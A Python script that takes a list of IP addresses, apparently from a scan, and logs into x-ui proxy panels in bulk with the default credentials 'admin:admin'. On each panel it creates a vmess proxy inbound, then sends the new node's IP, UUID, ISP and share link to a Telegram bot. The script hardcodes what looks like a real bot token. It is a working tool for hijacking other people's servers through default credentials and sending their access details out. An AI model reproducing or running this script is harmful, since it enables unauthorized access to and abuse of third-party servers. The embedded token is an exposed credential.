import requests
import json
import uuid
import random
import base64
from concurrent.futures import ThreadPoolExecutor

# 您提供的 create_node 函数，未做修改
def create_node(ip, port, login, pushid, pushToken):
    #参数获取与配置
    #手动配置,可默认
    path_node = "/arki?ed=2048" #ws路径
    headers_node = {}  #ws头部

    #生成uuid
    UUID_node = uuid.uuid4()
    port_node = random.randint(2000, 65530)

    #自动获取并解析参数
    login_splited = login.split(':')
    username = login_splited[0]
    password = login_splited[1]
    url_login = "http://"+ ip +":"+ port +"/login"
    url_create = "http://"+ ip +":"+ port +"/xui/inbound/add"

    data_login = {
        "username": username,
        "password": password
    }
    response = requests.post(url_login, json=data_login)
    cookies = response.headers.get("Set-Cookie")
    headers = {'Content-Type': 'application/json',
               'Cookie': cookies}
    settings = {
            "clients": [
                {
                    "id": str(UUID_node),
                    "alterId": 0
                }
            ],
            "disableInsecureEncryption": False
        }
    streamSettings = {
            "network": "ws",
            "security": "none",
            "wsSettings": {
                "path": path_node,
                "headers": headers_node
            }
        }
    sniffing = {
            "enabled": True,
            "destOverride": [
                "http",
                "tls"
            ]
        }
    data_create = {
        "remark": "Iranian",
        "enable": True,
        "expiryTime": 0,
        "listen": "0.0.0.0",
        "port": port_node,
        "protocol": "vmess",
        "settings": json.dumps(settings),
        "streamSettings": json.dumps(streamSettings),
        "sniffing": json.dumps(sniffing)
    }
    response = requests.post(url_create, headers=headers, json=data_create)
    if response.json()["success"] == True:
        url_ipdata = "http://ip-api.com/json/"+ip+"?fields=country,isp"
        response = requests.get(url_ipdata)
        country = response.json()["country"]
        isp = response.json()["isp"]


        node_config = {
            "v": "2",
            "ps": "Powered By @aries_init",
            "add": ip,
            "port": port_node,
            "id": str(UUID_node),
            "aid": 0,
            "net": "ws",
            "type": "none",
            "host": "",
            "path": path_node,
            "tls": "none"
        }
        #base64编码
        node_config_json = json.dumps(node_config)
        node_config_base64 = base64.b64encode(node_config_json.encode()).decode()

        #put all config into a string
        config_full = "Powered By @aries_init"
        config_full += "节点IP: "+ip+"\n"
        config_full += "节点端口: "+str(port_node)+"\n"
        config_full += "节点UUID: "+str(UUID_node)+"\n"
        config_full += "节点WS路径: "+path_node+"\n"
        config_full += "节点ISP: "+isp+"\n"
        config_full += "节点国家: "+country+"\n"
        config_full += "节点分享链接: `vmess://"+str(node_config_base64)+"`"
        print(config_full)
        
        ##Telegram机器人推送
        if pushid != "" and pushToken != "":
            url_push = "https://api.telegram.org/bot"+pushToken+"/sendMessage"
            data_push = {
                "chat_id": pushid,
                "text": config_full,
                "parse_mode": "Markdown"
            }
            response = requests.post(url_push, json=data_push)
            if response.json()["ok"] == True:
                print("推送成功")
            else:
                print("推送失败: "+response.text)
        else:
            print("未配置推送, 跳过推送")
    else:
        if pushid != "" and pushToken != "":
            url_push = "https://api.telegram.org/bot"+pushToken+"/sendMessage"
            data_push = {
                "chat_id": pushid,
                "text": "节点创建失败: "+response.text
            }
            response = requests.post(url_push, json=data_push)
            if response.json()["ok"] == True:
                print("推送成功")
            else:
                print("推送失败: "+response.text)
        else:
            print("节点创建失败: "+response.text)

# 从文件中读取IP地址和其他信息
def read_ips_from_file(filename):
    with open(filename, 'r') as file:
        lines = file.readlines()
    ips = [line.split(" ")[0] for line in lines]  # 从每行中提取IP地址
    return ips

# 主处理函数
def process_ips(filename, port, login, pushid, pushToken):
    ips = read_ips_from_file(filename)
    with ThreadPoolExecutor(max_workers=20) as executor:
        # 对每个IP并发调用 create_node
        for ip in ips:
            executor.submit(create_node, ip, port, login, pushid, pushToken)

# 主执行逻辑
if __name__ == "__main__":
    # 示例参数，根据实际情况替换
    filename = 'result.txt'
    port = "54321"  # 假设端口
    login = "admin:admin"
    pushid = "3610342"  # 假设 Telegram ID
    pushToken = "5677739231:AAG6zUBUJg2AQL9lxplHQBba1V5dNnVZnq4"  # 假设 Telegram Token

    # 处理文件中的IP地址
    process_ips(filename, port, login, pushid, pushToken)
